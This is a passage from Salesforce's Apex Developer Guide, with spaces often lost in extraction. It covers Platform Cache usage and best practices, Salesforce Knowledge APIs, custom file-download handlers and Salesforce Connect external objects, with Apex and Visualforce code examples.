namespace. The cache put calls are not allowed in a partition that the invoking class doesn’t own.
The put() method has multiple versions (or overloads), and each version takes different parameters. For example, to specify that your
cached value can’t be overwritten by another namespace, set the last parameter of this method to true. The following example also
sets the lifetime of the cached value (3600 seconds or 1 hour) and makes the value available to any namespace.
// Add a valueto the cachewithoptions
Cache.Org.put('ns1.partition1.totalSum', '500', 3600,Cache.Visibility.ALL,true);
To retrieve a cached value from the org cache, call the Cache.Org.get() method. Because Cache.Org.get() returns an
object, we recommend that you cast the returned value to a specific type.
// Get a cachedvalue
Objectobj = Cache.Org.get('ns1.partition1.orderDate');
// Castreturnvalueto a specificdatatype
DateTimedt2 = (DateTime)obj;
Cache.OrgPartition Methods
If you’re managing cache values in one partition, use the Cache.OrgPartition methods instead. After the partition object is
obtained, the process of adding and retrieving cache values is similar to using the Cache.Org methods. The Cache.OrgPartition
methods are easier to use because you specify only the key name without the namespace and partition prefix.
First, get the org partition and specify the desired partition. The partition name includes the namespace prefix:
namespace.partition. You can manage the cached values in that partition by adding and retrieving cache values on the obtained
partition object. The following example obtains the partition named myPartition in the myNs namespace. If the cache contains a value
with the key BookTitle, this cache value is retrieved. A new value is added with key orderDate and today’s date.
// Get partition
Cache.OrgPartitionorgPart= Cache.Org.getPartition('myNs.myPartition');
// Retrievecachevaluefromthe partition
if (orgPart.contains('BookTitle')) {
StringcachedTitle= (String)orgPart.get('BookTitle');
}
// Add cachevalueto the partition
orgPart.put('OrderDate', Date.today());
This example calls the get method on a partition in one expression without assigning the partition instance to a variable.
// Or use dot notationto callpartitionmethods
StringcachedAuthor= (String)Cache.Org.getPartition('myNs.myPartition').get('BookAuthor');
SEE ALSO:
Apex Reference Guide: Org Class
Apex Reference Guide: OrgPartition Class
502
Using Salesforce Features with ApexApex Developer Guide

Use a Visualforce Global Variable for the Platform Cache
You can access cached values stored in the session or org cache from a Visualforce page with global variables.
You can use either the $Cache.Session or $Cache.Org global variable. Include the global variable’s fully qualified key name
with the namespace and partition name.
This output text component retrieves a session cache value using the global variable’s namespace, partition, and key.
<apex:outputTextvalue="{!$Cache.Session.myNamespace.myPartition.key1}"/>
This example is similar but uses the $Cache.Org global variable to retrieve a value from the org cache.
<apex:outputTextvalue="{!$Cache.Org.myNamespace.myPartition.key1}"/>
Note:  The remaining examples show how to access the session cache using the $Cache.Session global variable. The
equivalent org cache examples are the same except that you use the $Cache.Org global variable instead.
Unlike with Apex methods, you can’t omit the myNamespace.myPartition prefix to reference the default partition in the org.
If a namespace isn’t defined for the org, use local to refer to the org’s namespace.
<apex:outputTextvalue="{!$Cache.Session.local.myPartition.key1}"/>
The cached value is sometimes a data structure that has properties or methods, like an Apex list or a custom class. In this case, you can
access the properties in the $Cache.Session or $Cache.Org expression by using dot notation. For example, this markup
invokes the List.size() Apex method if the value of numbersList is declared as a List.
<apex:outputTextvalue="{!$Cache.Session.local.myPartition.numbersList.size}"/>
This example accesses the value property on the myData cache value that is declared as a custom class.
<apex:outputTextvalue="{!$Cache.Session.local.myPartition.myData.value}"/>
If you’re using CacheBuilder, qualify the key name with the class that implements the CacheBuilder interface and the literal
string _B_, in addition to the namespace and partition name. In this example, the class that implements CacheBuilder is called
CacheBuilderImpl.
<apex:outputTextvalue="{!$Cache.Session.myNamespace.myPartition.CacheBuilderImpl_B_key1}"/>
Safely Cache Values with the CacheBuilder Interface
A Platform Cache best practice is to ensure that your Apex code handles cache misses by testing for cache requests that return null. You
can write this code yourself. Or, you can use the Cache.CacheBuilder interface, which makes it easy to safely store and retrieve
values to a session or org cache.
Rather than just declaring what you want to cache in your Apex class, create an inner class that implements the CacheBuilder
interface. The interface has a single method, doLoad(Stringvar), which you override by coding the logic that builds the cached
value based on the doLoad(Stringvar) method’s argument.
To retrieve a value that you’ve cached with CacheBuilder, you don’t call the doLoad(Stringvar) method directly. Instead,
it’s called indirectly by Salesforce the first time you reference the class that implements CacheBuilder. Subsequent calls get the
value from the cache, as long as the value exists. If the value doesn’t exist, the doLoad(Stringvar) method is called again to
build the value and then return it. As a result, you don’t execute put() methods when using the CacheBuilder interface. And
because the doLoad(Stringvar) method checks for cache misses, you don’t have to write the code to check for nulls yourself.
Let’s look at an example. Suppose you’re coding an Apex controller class for a Visualforce page. In the Apex class, you often run a SOQL
query that looks up a User record based on a user ID. SOQL queries can be expensive, and Salesforce user records don’t typically change
much, so the User information is a good candidate for CacheBuilder.
503
Using Salesforce Features with ApexApex Developer Guide

In your controller class, create an inner class that implements the CacheBuilder interface and overrides the doLoad(String
var) method. Then add the SOQL code to the doLoad(Stringvar) method with the user ID as its parameter.
classUserInfoCacheimplementsCache.CacheBuilder{
publicObjectdoLoad(Stringuserid){
Useru = (User)[SELECTId, IsActive,usernameFROMUserWHEREid =: userid];
returnu;
}
}
To retrieve the User record from the org cache, execute the Org.get(cacheBuilder,key) method, passing it the
UserInfoCache class and the user ID. Similarly, use Session.get(cacheBuilder,key) and
Partition.get(cacheBuilder,key) to retrieve the value from the session or partition cache, respectively.
Userbatman= (User)Cache.Org.get(UserInfoCache.class, ‘00541000000ek4c');
When you run the get() method, Salesforce searches the cache using a unique key that consists of the strings 00541000000ek4c and
UserInfoCache. If Salesforce finds a cached value, it returns it. For this example, the cached value is a User record associated with the ID
00541000000ek4c. If Salesforce doesn’t find a value, it executes the doLoad(Stringvar) method of UserInfoCache again
(and reruns the SOQL query), caches the User record, and then returns it.
CacheBuilder Coding Requirements
Follow these requirements when you code a class that implements the CacheBuilder interface.
•
The doLoad(Stringvar) method must take a String parameter, even if you do not use the parameter in the method’s
code. Salesforce uses the string, along with the class name, to build a unique key for the cached value.
•
The doLoad(Stringvar) method can return any value, including null. If a null value is returned, it is delivered directly to the
CacheBuilder consumer and not cached. CacheBuilder consumers are expected to handle null values gracefully. We recommend
using null values to reflect a temporary failure to re-build the cache key.
•
The class that implements CacheBuilder must be non-static because Salesforce instantiates a new instance of the class and
runs the doLoad(Stringvar) method to create the cached value.
SEE ALSO:
Apex Reference Guide: CacheBuilder Interface
Platform Cache Best Practices
Platform Cache can greatly improve performance in your applications. However, it’s important to follow these guidelines to get the best
cache performance. In general, it’s more efficient to cache a few large items than to cache many small items separately. Also be mindful
of cache limits to prevent unexpected cache evictions.
Evaluate the Performance Impact
To test whether Platform Cache improves performance in your application, calculate the elapsed time with and without using the cache.
Don’t rely on the Apex debug log timestamp for the execution time. Use the System.currentTimeMillis() method instead.
For example, first call System.currentTimeMillis() to get the start time. Perform application logic, fetching the data from
either the cache or another data source. Then calculate the elapsed time.
longstartTime= System.currentTimeMillis();
// Yourcodehere
504
Using Salesforce Features with ApexApex Developer Guide

longelapsedTime= System.currentTimeMillis()- startTime;
System.debug(elapsedTime);
Handle Cache Misses Gracefully
Ensure that your code handles cache misses by testing cache requests that return null. To help with debugging, add logging information
for cache operations.
Alternatively, use the Cache.CacheBuilder interface, which checks for cache misses.
publicclassCacheManager{
privateBooleancacheEnabled;
publicvoidCacheManager(){
cacheEnabled= true;
}
publicBooleantoggleEnabled(){ // Use for testingmisses
cacheEnabled= !cacheEnabled;
returncacheEnabled;
}
publicObjectget(Stringkey){
if (!cacheEnabled)returnnull;
Objectvalue= Cache.Session.get(key);
if (value!= null) System.debug(LoggingLevel.DEBUG,'Hitfor key ' + key);
returnvalue;
}
publicvoidput(Stringkey,Objectvalue,Integerttl){
if (!cacheEnabled)return;
Cache.Session.put(key,value,ttl);
// for redundancy,saveto DB
System.debug(LoggingLevel.DEBUG,'put()for key ' + key);
}
publicBooleanremove(Stringkey){
if (!cacheEnabled)returnfalse;
Booleanremoved= Cache.Session.remove(key);
if (removed){
System.debug(LoggingLevel.DEBUG,'Removedkey ' + key);
returntrue;
} elsereturnfalse;
}
}
Group Cache Requests
When possible, group cache requests, but be aware of caching limits. To help improve performance, perform cache operations on a list
of keys rather than on individual keys. For example, if you know which keys are necessary to invoke a Visualforce page or perform a task
in Apex, retrieve all keys at once. To retrieve multiple keys, call get(keys) in an initialization method.
505
Using Salesforce Features with ApexApex Developer Guide

Cache Larger Items
It’s more efficient to cache a few large items than to cache many small items separately. Caching many small items decreases performance
and increases overhead, including total serialization size, serialization time, cache commit time, and cache capacity usage.
Don’t add many small items to the Platform Cache within one request. Instead, wrap data in larger items, such as lists. If a list is large,
consider breaking it into multiple items. Here’s an example of what to avoid.
// Don'tdo this!
publicclassMyController{
publicvoidinitCache(){
List<Account>accts= [SELECTId, Name,Phone,Industry,DescriptionFROM
Accountlimit1000];
for (Integeri=0;i<accts.size();i++){
Cache.Org.put('acct'+ i, accts.get(i));
}
}
}
Instead, wrap the data in a few reasonably large items without exceeding the limit on the size of single cached items.
// Do thisinstead.
publicclassMyController{
publicvoidinitCache(){
List<Account>accts= [SELECTId, Name,Phone,Industry,DescriptionFROM
Accountlimit1000];
Cache.Org.put('accts', accts);
}
}
Another good example of caching larger items is to encapsulate data in an Apex class. For example, you can create a class that wraps
session data, and cache an instance of the class rather than the individual data items. Caching the class instance improves overall
serialization size and performance.
Be Aware of Cache Limits
When you add items to the cache, be aware of the following limits.
Cache Partition Size Limit
When the cache partition limit is reached, keys are evicted until the cache is reduced to 100% capacity. Platform Cache uses a least
recently used (LRU) algorithm to evict keys from the cache.
Local Cache Size Limit
When you add items to the cache, make sure that you are not exceeding local cache limits within a request. The local cache limit
for the session cache is 500 KB and 1,000 KB for the org cache. If you exceed the local cache limit, items can be evicted from the local
cache before the request has been committed. This eviction can cause unexpected misses and long serialization time and can waste
resources.
Single Cached Item Size Limit
The size of individual cached items is limited to 100 KB. If the serialized size of an item exceeds this limit, the
Cache.ItemSizeLimitExceededException exception is thrown. It’s a good practice to catch this exception and reduce
the size of the cached item.
506
Using Salesforce Features with ApexApex Developer Guide

Use the Cache Diagnostics Page (Sparingly)
To determine how much of the cache is used, check the Platform Cache Diagnostics page. To reach the Diagnostics page:
1.Make sure that Cache Diagnostics is enabled for the user (on the User Detail page).
2.On the Platform Cache Partition page, click the partition name.
3.Click the link to the Diagnostics page for the partition.
The Diagnostics page provides valuable information, including the capacity usage, keys, and serialized and compressed sizes of the
cached items. The session cache and org cache have separate diagnostics pages. The session cache diagnostics are per session, and they
don’t provide insight across all active sessions.
Note:  Generating the diagnostics page gathers all partition-related information and is an expensive operation. Use it sparingly.
Minimize Expensive Operations
Consider the following guidelines to minimize expensive operations.
•
Use Cache.Org.getKeys() and Cache.Org.getCapacity() sparingly. Both methods are expensive, because they
traverse all partition-related information looking for or making calculations for a given partition.
Note: Cache.Session usage is not expensive.
•
Avoid calling the contains(key) method followed by the get(key) method. If you intend to use the key value, simply call
the get(key) method and make sure that the value is not equal to null.
•
Clear the cache only when necessary. Clearing the cache traverses all partition-related cache space, which is expensive. After clearing
the cache, your application will likely regenerate the cache by invoking database queries and computations. This regeneration can
be complex and extensive and impact your application’s performance.
SEE ALSO:
Platform Cache Limits
Apex Reference Guide: CacheBuilder Interface
Salesforce Knowledge
Salesforce Knowledge is a knowledge base where users can easily create and manage content, known as articles, and quickly find and
view the articles they need.
Use Apex to access these Salesforce Knowledge features:
Knowledge Management
Users can write, publish, archive, and manage articles using Apex in addition to the Salesforce user interface.
Promoted Search Terms
Promoted search terms are useful for promoting a Salesforce Knowledge article that you know is commonly used to resolve a support
issue when an end user’s search contains certain keywords.Users can promote an article in search results by associating keywords
with the article in Apex (by using the SearchPromotionRule sObject) in addition to the Salesforce user interface.
Suggest Salesforce Knowledge Articles
Provide users with shortcuts to navigate to relevant articles before they perform a search. Call Search.suggest(searchText,
objectType,options) to return a list of Salesforce Knowledge articles whose titles match a user’s search query string.
507
Using Salesforce Features with ApexApex Developer Guide

Knowledge Management
Users can write, publish, archive, and manage articles using Apex in addition to the Salesforce user interface.
Use the methods in the KbManagement.PublishingService class to manage the following parts of the lifecycle of an article
and its translations:
•
Publishing
•
Updating
•
Retrieving
•
Deleting
•
Submitting for translation
•
Setting a translation to complete or incomplete status
•
Archiving
•
Assigning review tasks for draft articles or translations
Note:  Date values are based on GMT.
To use the methods in this class, you must enable Salesforce Knowledge. See Salesforce Knowledge Implementation Guide for more
information on setting up Salesforce Knowledge.
SEE ALSO:
Apex Reference Guide: PublishingService Class
Promoted Search Terms
Promoted search terms are useful for promoting a Salesforce Knowledge article that you know is commonly used to resolve a support
issue when an end user’s search contains certain keywords.Users can promote an article in search results by associating keywords with
the article in Apex (by using the SearchPromotionRule sObject) in addition to the Salesforce user interface.
Articles must be in published status (with a PublishSatus field value of Online) for you to manage their promoted terms.
Example:  This code sample shows how to add a search promotion rule. This sample performs a query to get published articles
of type MyArticle__kav. Next, the sample creates a SearchPromotionRule sObject to promote articles that contain the word
“Salesforce” and assigns the first returned article to it. Finally, the sample inserts this new sObject.
// Identifythe articleto promotein searchresults
List<MyArticle__kav>articles= [SELECTId FROMMyArticle__kavWHERE
PublishStatus='Online'AND Language='en_US'AND Id='ArticleId'];
// Definethe promotionrule
SearchPromotionRules = new SearchPromotionRule(
Query='Salesforce',
PromotedEntity=articles[0]);
// Savethe new rule
inserts;
To perform DML operations on the SearchPromotionRule sObject, you must enable Salesforce Knowledge.
508
Using Salesforce Features with ApexApex Developer Guide

Suggest Salesforce Knowledge Articles
Provide users with shortcuts to navigate to relevant articles before they perform a search. Call Search.suggest(searchText,
objectType,options) to return a list of Salesforce Knowledge articles whose titles match a user’s search query string.
To return suggestions, enable Salesforce Knowledge. See Salesforce Knowledge Implementation Guide for more information on setting
up Salesforce Knowledge.
This Visualforce page has an input field for searching articles or accounts. When the user presses the Suggest button, suggested records
are displayed. If there are more than five results, the More results button appears. To display more results, click the button.
<apex:pagecontroller="SuggestionDemoController">
<apex:form>
<apex:pageBlockmode="edit"id="block">
<h1>Articleand RecordSuggestions</h1>
<apex:pageBlockSection>
<apex:pageBlockSectionItem>
<apex:outputPanel>
<apex:panelGroup>
<apex:selectListvalue="{!objectType}"size="1">
<apex:selectOptionitemLabel="Account"itemValue="Account"
/>
<apex:selectOptionitemLabel="Article"
itemValue="KnowledgeArticleVersion"/>
<apex:actionSupportevent="onchange"rerender="block"/>
</apex:selectList>
</apex:panelGroup>
<apex:panelGroup>
<apex:inputHiddenid="nbResult"value="{!nbResult}"/>
<apex:outputLabelfor="searchText">SearchText</apex:outputLabel>
&nbsp;
<apex:inputTextid="searchText"value="{!searchText}"/>
<apex:commandButtonid="suggestButton"value="Suggest"
action="{!doSuggest}"
rerender="block"/>
<apex:commandButtonid="suggestMoreButton"value="More
results..."action="{!doSuggestMore}"
rerender="block"style="{!IF(hasMoreResults,
'', 'display:none;')}"/>
</apex:panelGroup>
</apex:outputPanel>
</apex:pageBlockSectionItem>
</apex:pageBlockSection>
<apex:pageBlockSectiontitle="Results"id="results"columns="1"
rendered="{!results.size>0}">
<apex:dataListvalue="{!results}"var="w" type="1">
Id: {!w.SObject['Id']}
<br />
<apex:panelGrouprendered="{!objectType=='KnowledgeArticleVersion'}">
Title:{!w.SObject['Title']}
</apex:panelGroup>
<apex:panelGrouprendered="{!objectType!='KnowledgeArticleVersion'}">
Name:{!w.SObject['Name']}
509
Using Salesforce Features with ApexApex Developer Guide

</apex:panelGroup>
<hr />
</apex:dataList>
</apex:pageBlockSection>
<apex:pageBlockSectionid="noresults"rendered="{!results.size==0}">
No results
</apex:pageBlockSection>
<apex:pageBlockSectionrendered="{!LEN(searchText)>0}">
Searchtext:{!searchText}
</apex:pageBlockSection>
</apex:pageBlock>
</apex:form>
</apex:page>
This code is the custom Visualforce controller for the page:
publicclassSuggestionDemoController{
publicStringsearchText;
publicStringlanguage= 'en_US';
publicStringobjectType= 'Account';
publicIntegernbResult= 5;
publicTransientSearch.SuggestionResultssuggestionResults;
publicStringgetSearchText(){
returnsearchText;
}
publicvoidsetSearchText(Strings) {
searchText= s;
}
publicIntegergetNbResult(){
returnnbResult;
}
publicvoidsetNbResult(Integern) {
nbResult= n;
}
publicStringgetLanguage(){
returnlanguage;
}
publicvoidsetLanguage(Stringlanguage){
this.language= language;
}
publicStringgetObjectType(){
returnobjectType;
}
publicvoidsetObjectType(StringobjectType){
this.objectType= objectType;
}
510
Using Salesforce Features with ApexApex Developer Guide

publicList<Search.SuggestionResult>getResults(){
if (suggestionResults== null) {
returnnew List<Search.SuggestionResult>();
}
returnsuggestionResults.getSuggestionResults();
}
publicBooleangetHasMoreResults(){
if (suggestionResults== null) {
returnfalse;
}
returnsuggestionResults.hasMoreResults();
}
publicPageReferencedoSuggest(){
nbResult= 5;
suggestAccounts();
returnnull;
}
publicPageReferencedoSuggestMore(){
nbResult+= 5;
suggestAccounts();
returnnull;
}
privatevoidsuggestAccounts(){
Search.SuggestionOptionoptions= new Search.SuggestionOption();
Search.KnowledgeSuggestionFilterfilters= new Search.KnowledgeSuggestionFilter();
if (objectType=='KnowledgeArticleVersion') {
filters.setLanguage(language);
filters.setPublishStatus('Online');
}
options.setFilter(filters);
options.setLimit(nbResult);
suggestionResults= Search.suggest(searchText,objectType,options);
}
}
SEE ALSO:
Search.suggest(searchQuery,sObjectType,suggestions)
Salesforce Files
Use Apex to customize the behavior of Salesforce Files.
511
Using Salesforce Features with ApexApex Developer Guide

Customize File Downloads
You can customize the behavior of files when users attempt to download them using an Apex callback. ContentVersion supports
modified file behavior, such as antivirus scanning and information rights management (IRM), after the download operation. File
download customization is available in API version 39.0 and later.
Custom File Download Examples
You can use Apex to customize the behavior of files upon attempted download. These examples assume that only one file is being
downloaded. File download customization is available in API version 39.0 and later.
Customize File Downloads
You can customize the behavior of files when users attempt to download them using an Apex callback. ContentVersion supports modified
file behavior, such as antivirus scanning and information rights management (IRM), after the download operation. File download
customization is available in API version 39.0 and later.
Customization code runs before download and determines whether the download can proceed.
The Sfc namespace contains Apex objects for customizing the behavior of Salesforce Files before they are downloaded.
ContentDownloadHandlerFactory provides an interface for customizing file downloads. The ContentDownloadHandler
class defines values related to whether download is allowed, and what to do otherwise. The ContentDownloadContext enum
is the context in which the download takes place.
You can use Apex to customize multiple-file downloads from the Content tab in Salesforce Classic. The Apex function parameter List<ID>
handles a list of ContentVersion IDs.
Customization also works on content packs and content deliveries. List<ID> is a list of the version IDs in a ContentPack. Setting
isDownloadAllowed= false on a multi-file or ContentPack download causes the entire download to fail. You can pass a list
of the problem files back to an error page via URL parameters in redirectUrl.
Example:
•
Prevent a file from downloading based on the user profile, device being used, or file type and size.
•
Apply IRM control to track information, such as the number of times a file has been downloaded.
•
Flag suspicious files before download, and redirect them for antivirus scanning.
Flow Execution
When a download is triggered either from the UI, Connect API, or an sObject call retrieving ContentVersion.VersionData,
implementations of the Sfc.ContentDownloadHandlerFactory are looked up. If no implementation is found, download
proceeds. Otherwise, the user is redirected to what has been defined in the ContentDownloadHandler#redirectUrl
property. If several implementations are found, they are cascade handled (ordered by name) and the first one for which the download
isn’t allowed is considered.
Note:  If a SOAP API operation triggers a download, it goes through the Apex class that checks whether the download is allowed.
If a download isn’t allowed, a redirection can’t be handled, and an exception containing an error message is returned instead.
Custom File Download Examples
You can use Apex to customize the behavior of files upon attempted download. These examples assume that only one file is being
downloaded. File download customization is available in API version 39.0 and later.
512
Using Salesforce Features with ApexApex Developer Guide

Example:  This example demonstrates a system that requires downloads to go through IRM control for some users. For a Modify
All Data (MAD) user who’s allowed to download files, and whose user ID is 005xx:
// Allowcustomizationof the contentDownloadexperience
publicclassContentDownloadHandlerFactoryImplimplements
Sfc.ContentDownloadHandlerFactory{
publicSfc.ContentDownloadHandlergetContentDownloadHandler(List<ID> ids,
Sfc.ContentDownloadContextcontext){
Sfc.ContentDownloadHandlercontentDownloadHandler= new Sfc.ContentDownloadHandler();
if(UserInfo.getUserId()== '005xx') {
contentDownloadHandler.isDownloadAllowed= true;
returncontentDownloadHandler;
}
contentDownloadHandler.isDownloadAllowed= false;
contentDownloadHandler.downloadErrorMessage= 'Thisfileneedsto be IRM controlled.
You're not allowedto downloadit';
contentDownloadHandler.redirectUrl='/apex/IRMControl?Id='+ids.get(0);
returncontentDownloadHandler;
}
}
Note:  To refer to a MAD user profile, you can use UserInfo.getProfileId() instead of
UserInfo.getUserId().
In this example, IRMControl is a Visualforce page created for displaying a link to download a file from the IRM system. You
need a controller for this page that calls your IRM system. As it’s processing the file, it gives an endpoint to download the file when
it’s controlled. Your IRM system uses the sObject API to get the VersionData of this ContentVersion. Therefore, the IRM
system needs the VersionID and must retrieve the VersionData using the MAD user.
Your IRM system is at http://irmsystem and is expecting the VersionID as a query parameter. The IRM system returns a
JSON response with the download endpoint in a downloadEndpoint value.
publicclassIRMController{
privateStringdownloadEndpoint;
publicIRMController(){
downloadEndpoint= '';
}
publicvoidapplyIrmControl(){
StringversionId= ApexPages.currentPage().getParameters().get('id');
Httph = new Http();
//Instantiatea new HTTPrequest,specifythe method(GET)as wellas the endpoint
HttpRequestreq = new HttpRequest();
req.setEndpoint('http://irmsystem?versionId='+ versionId);
req.setMethod('GET');
// Sendthe request,and retrievea response
513
Using Salesforce Features with ApexApex Developer Guide

HttpResponser = h.send(req);
JSONParserparser= JSON.createParser(r.getBody());
while(parser.nextToken()!= null) {
if ((parser.getCurrentToken()== JSONToken.FIELD_NAME)&&
(parser.getText()== 'downloadEndpoint')) {
parser.nextToken();
downloadEndpoint= parser.getText();
break;
}
}
}
publicStringgetDownloadEndpoint(){
returndownloadEndpoint;
}
}
Example:  The following example creates a class that implements the ContentDownloadHandlerFactory interface
and returns a download handler that prevents downloading a file to a mobile device.
// Allowcustomizationof the contentDownloadexperience
publicclassContentDownloadHandlerFactoryImplimplements
Sfc.ContentDownloadHandlerFactory{
publicSfc.ContentDownloadHandlergetContentDownloadHandler(List<ID> ids,
Sfc.ContentDownloadContextcontext){
Sfc.ContentDownloadHandlercontentDownloadHandler= new Sfc.ContentDownloadHandler();
if(context== Sfc.ContentDownloadContext.MOBILE){
contentDownloadHandler.isDownloadAllowed= false;
contentDownloadHandler.downloadErrorMessage= 'Downloadinga filefroma mobile
deviceisn't allowed.';
returncontentDownloadHandler;
}
contentDownloadHandler.isDownloadAllowed= true;
returncontentDownloadHandler;
}
Example:  You can also prevent downloading a file from a mobile device and require that a file must go through IRM control.
// Allowcustomizationof the contentDownloadexperience
publicclassContentDownloadHandlerFactoryImplimplements
Sfc.ContentDownloadHandlerFactory{
publicSfc.ContentDownloadHandlergetContentDownloadHandler(List<ID> ids,
Sfc.ContentDownloadContextcontext){
Sfc.ContentDownloadHandlercontentDownloadHandler= new Sfc.ContentDownloadHandler();
if(UserInfo.getUserId()== '005xx000001SvogAAC') {
contentDownloadHandler.isDownloadAllowed= true;
returncontentDownloadHandler;
514
Using Salesforce Features with ApexApex Developer Guide

}
if(context== Sfc.ContentDownloadContext.MOBILE){
contentDownloadHandler.isDownloadAllowed= false;
contentDownloadHandler.downloadErrorMessage= 'Downloadinga filefroma mobile
deviceisn't allowed.';
returncontentDownloadHandler;
}
contentDownloadHandler.isDownloadAllowed= false;
contentDownloadHandler.downloadErrorMessage= 'Thisfileneedsto be IRM controlled.
You're not allowedto downloadit';
contentDownloadHandler.redirectUrl='/apex/IRMControl?Id='+id.get(0);
returncontentDownloadHandler;
}
}
Salesforce Connect
Apex code can access external object data via any Salesforce Connect adapter. Use the Apex Connector Framework to develop a custom
adapter for Salesforce Connect. The custom adapter can retrieve data from external systems and synthesize data locally. Salesforce
Connect represents that data in Salesforce external objects, enabling users and the Lightning Platform to seamlessly interact with data
that’s stored outside the Salesforce org.
Apex Considerations for Salesforce Connect External Objects
Apex code can access external object data via any Salesforce Connect adapter, but some requirements and limitations apply.
Writable External Objects
By default, external objects are read only, but you can make them writable. Doing so lets Salesforce users and APIs create, update,
and delete data that’s stored outside the org by interacting with external objects within the org. For example, users can see all the
orders that reside in an SAP system that are associated with an account in Salesforce. Then, without leaving the Salesforce user
interface, they can place a new order or route an existing order. The relevant data is automatically created or updated in the SAP
system.
External Change Data Capture Packaging and Testing
You can distribute External Change Data Capture components in managed packages, including a framework for testing your Apex
triggers. Special behaviors and limitations apply to packaging and package installation.
Mock SOQL Tests for External Objects
You can mock SOQL query responses for external objects in Apex testing by using SOQL stub methods and a new test class. Use
basic and joined SOQL queries against external objects and return mock records in a testing context.
Get Started with the Apex Connector Framework
To get started with your first custom adapter for Salesforce Connect, create two Apex classes: one that extends the
DataSource.Connection class, and one that extends the DataSource.Provider class.
Key Concepts About the Apex Connector Framework
The DataSource namespace provides the classes for the Apex Connector Framework. Use the Apex Connector Framework to
develop a custom adapter for Salesforce Connect. Then connect your Salesforce org to any data anywhere via the Salesforce Connect
custom adapter.
Considerations for the Apex Connector Framework
Understand the limits and considerations for creating Salesforce Connect custom adapters with the Apex Connector Framework.
515
Using Salesforce Features with ApexApex Developer Guide

Apex Connector Framework Examples
These examples illustrate how to use the Apex Connector Framework to create custom adapters for Salesforce Connect.
SEE ALSO:
Salesforce Help: Access External Data With Salesforce Connect
Salesforce Connect Learning Map
Apex Considerations for Salesforce Connect External Objects
Apex code can access external object data via any Salesforce Connect adapter, but some requirements and limitations apply.
•
These features aren’t available for external objects.
–
Apex-managed sharing
–
Apex triggers (However, you can create triggers on external change data capture events from OData 4.0 connections.)
•
When developers use Apex to manipulate external object records, asynchronous timing and an active background queue minimize
potential save conflicts. A specialized set of Apex methods and keywords handles potential timing issues with write execution. Apex
also lets you retrieve the results of delete and upsert operations. Use the BackgroundOperation object to monitor job progress for
write operations via the API or SOQL.
•
Database.insertAsync() methods can’t be executed in the context of a portal user, even when the portal user is a
community member. To add external object records via Apex, use Database.insertImmediate() methods.
Important:  When running an iterable batch Apex job against an external data source, the external records are stored in Salesforce
while the job is running. The data is removed from storage when the job completes, whether or not the job was successful. No
external data is stored during batch Apex jobs that use Database.QueryLocator.
•
If you use batch Apex with Database.QueryLocator to access external objects via an OData adapter for Salesforce Connect:
–
Enable Request Row Counts on the external data source, and each response from the external system must include the total
row count of the result set.
–
We recommend enabling Server Driven Pagination on the external data source and having the external system determine page
sizes and batch boundaries for large result sets. Typically, server-driven paging can adjust batch boundaries to accommodate
changing datasets more effectively than client-driven paging.
When Server Driven Pagination is disabled on the external data source, the OData adapter controls the paging behavior
(client-driven). If external object records are added to the external system while a job runs, other records can be processed twice.
If external object records are deleted from the external system while a job runs, other records can be skipped.
–
When Server Driven Pagination is enabled on the external data source, the batch size at runtime is the smaller of the following:
•
Batch size specified in the scope parameter of Database.executeBatch. Default is 200 records.
•
Page size returned by the external system. We recommend that you set up your external system to return page sizes of 200
or fewer records.
SEE ALSO:
Use Batch Apex
Salesforce Help: Client-driven and Server-driven Paging for Salesforce Connect—OData 2.0 and 4.0 Adapters
Salesforce Help: Define an External Data Source for Salesforce Connect—OData 2.0 or 4.0 Adapter
516
Using Salesforce Features with ApexApex Developer Guide

Writable External Objects
By default, external objects are read only, but you can make them writable. Doing so lets Salesforce users and APIs create, update, and
delete data that’s stored outside the org by interacting with external objects within the org. For example, users can see all the orders
that reside in an SAP system that are associated with an account in Salesforce. Then, without leaving the Salesforce user interface, they
can place a new order or route an existing order. The relevant data is automatically created or updated in the SAP system.
Access to external data depends on the connections between Salesforce and the external systems that store the data. Network latency
and the availability of the external systems can introduce timing issues with Apex write or delete operations on external objects.
Because of the complexity of these connections, Apex can’t execute standard insert(), update(), or create() operations
on external objects. Instead, Apex provides a specialized set of database methods and keywords to work around potential issues with
write execution. DML insert, update, create, and delete operations on external objects are either asynchronous or executed when specific
criteria are met.
This example uses the Database.insertAsync() method to insert a new order into a database table asynchronously. It returns
a SaveResult object that contains a unique identifier for the insert job.
publicvoidcreateOrder() {
SalesOrder__xorder= new SalesOrder__x();
Database.SaveResultsr = Database.insertAsync(order);
if (! sr.isSuccess()) {
Stringlocator=  Database.getAsyncLocator( sr );
completeOrderCreation(locator);
}
}
Note:  Writes performed on external objects through the Salesforce user interface or the API are synchronous and work the same
way as for standard and custom objects.
You can perform the following DML operations on external objects, either asynchronously or based on criteria: insert records, update
records, upsert records, or delete records. Use classes in the DataSource namespace to get the unique identifiers for asynchronous
jobs, or to retrieve results lists for upsert, delete, or save operations.
When you initiate an Apex method on an external object, a job is scheduled and placed in the background jobs queue. The
BackgroundOperation object lets you view the job status for write operations via the API or SOQL. Monitor job progress and related
errors in the org, extract statistics, process batch jobs, or see how many errors occur in a specified time period.
For usage information and examples, see Database Namespace and DataSource Namespace.
SEE ALSO:
Salesforce Help: Writable External Objects Considerations for Salesforce Connect—All Adapters
External Change Data Capture Packaging and Testing
You can distribute External Change Data Capture components in managed packages, including a framework for testing your Apex
triggers. Special behaviors and limitations apply to packaging and package installation.
•
Include External Change Data Tracking components in a managed package by selecting your test from the Apex Class Component
Type list. The trigger, test, external data source, external object, and other related assets are brought into the package for distribution.
•
Certificates aren’t packageable. If you package an external data source that specifies a certificate, make sure that the subscriber org
has a valid certificate with the same name.
To help you test your External Change Data Capture–triggered Apex classes, here is a unit test code example of a trigger reacting to a
simulated external change.
517
Using Salesforce Features with ApexApex Developer Guide

Example Trigger
triggerOnExternalProductChangeEventForAuditon Products__ChangeEvent(afterinsert) {
if (Trigger.new.size()!= 1) return;
for (Products__ChangeEventevent:Trigger.new) {
Product_Audit__caudit= new Product_Audit__c();
audit.Name= 'ProductChangeOn'+ event.ExternalId;
audit.Change_Type__c= event.ChangeEventHeader.getChangeType();
audit.Audit_Price__c= event.Price__c;
audit.Product_Name__c= event.Name__c;
insert(audit);
}
}
Apex Test
@isTest
publicclasstestOnExternalProductChangeEventForAudit{
statictestMethodvoidtestExternalProductChangeTrigger(){
// CreateChangeEvent
Products__ChangeEventevent= new Products__ChangeEvent();
// Set ChangeEventHeaderFields
EventBus.ChangeEventHeaderheader= new EventBus.ChangeEventHeader();
header.changeType='CREATE';
header.entityName='Products__x';
header.changeOrigin='here';
header.transactionKey= 'some';
header.commitUser= 'me';
